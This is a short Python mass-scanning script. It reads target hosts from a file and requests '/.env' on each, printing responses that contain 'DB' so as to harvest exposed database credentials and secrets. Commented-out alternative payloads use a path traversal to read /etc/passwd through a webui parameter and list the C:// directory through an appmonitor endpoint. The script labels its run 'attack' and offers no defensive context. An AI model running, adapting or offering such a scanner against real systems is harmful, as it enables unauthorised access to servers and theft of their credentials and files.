import requests

headers = {
    "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50", 
    "Content-Type":"application/x-www-form-urlencoded"
    }
def scan(url:str,poc:str):
    url=url+poc
    try:
        r=requests.get(url,headers=headers,timeout=1)
        if "DB" in r.text:
            print(url,end=" ")
            print(r.json())
    except:
        print("no",end="")

# poc="/webui/?g=sys_dia_data_check&file_name=../../etc/passwd"
poc="/.env"
# poc1="appmonitor/protected/selector/server_file/files?folder=C://&suffix="
with open("host.txt","r",encoding="utf-8") as file:
    i=0
    print("attack")
    for url in file:
        print("->"*(i+1))
        if "http://" not in url and "https://" not in url:
            url="http://"+url
        scan(url=url.strip(),poc=poc)
        i+=1
